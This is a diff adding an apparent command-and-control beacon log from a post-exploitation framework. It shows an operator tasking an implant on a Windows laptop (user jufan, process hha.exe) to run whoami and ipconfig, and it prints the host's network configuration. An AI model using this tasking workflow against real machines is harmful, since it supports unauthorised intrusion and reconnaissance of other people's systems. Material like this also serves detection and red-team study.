@@ -1,0 +1,75 @@
+12/19 12:50:05 UTC [metadata] 120.230.87.173 <- 192.168.56.107; computer: LAPTOP-P9197NDV; user: jufan; process: hha.exe; pid: 19292; os: Windows; version: 6.2; build: 9200; beacon arch: x64 (x64)
+12/19 12:50:03 UTC [input] <s09> sleep 1
+12/19 12:50:03 UTC [task] <T1029> Tasked beacon to sleep for 1s
+12/19 12:50:10 UTC [input] <s09> shell whoami
+12/19 12:50:10 UTC [task] <T1059> Tasked beacon to run: whoami
+12/19 12:50:13 UTC [checkin] host called home, sent: 53 bytes
+12/19 12:50:13 UTC [output]
+received output:
+laptop-p9197ndv\jufan
+
+
+12/19 12:50:26 UTC [input] <s09> shell ipconfig
+12/19 12:50:26 UTC [task] <T1059> Tasked beacon to run: ipconfig
+12/19 12:50:26 UTC [checkin] host called home, sent: 39 bytes
+12/19 12:50:26 UTC [output]
+received output:
+
+Windows IP 配置
+
+
+以太网适配器 以太网 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 以太网 3:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+未知适配器 OpenVPN TAP-Windows6:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+无线局域网适配器 本地连接* 1:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+无线局域网适配器 本地连接* 2:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+以太网适配器 VMware Network Adapter VMnet1:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::2bb:bf30:4daf:b9c6%12
+   IPv4 地址 . . . . . . . . . . . . : 10.10.10.1
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+以太网适配器 VMware Network Adapter VMnet8:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::4f7c:52d0:d39f:6b1b%10
+   IPv4 地址 . . . . . . . . . . . . : 192.168.11.1
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 
+
+无线局域网适配器 WLAN:
+
+   连接特定的 DNS 后缀 . . . . . . . : 
+   本地链接 IPv6 地址. . . . . . . . : fe80::b285:f387:ca21:af8%4
+   IPv4 地址 . . . . . . . . . . . . : 192.168.56.107
+   子网掩码  . . . . . . . . . . . . : 255.255.255.0
+   默认网关. . . . . . . . . . . . . : 192.168.56.1
+
+以太网适配器 蓝牙网络连接:
+
+   媒体状态  . . . . . . . . . . . . : 媒体已断开连接
+   连接特定的 DNS 后缀 . . . . . . . : 
+
+
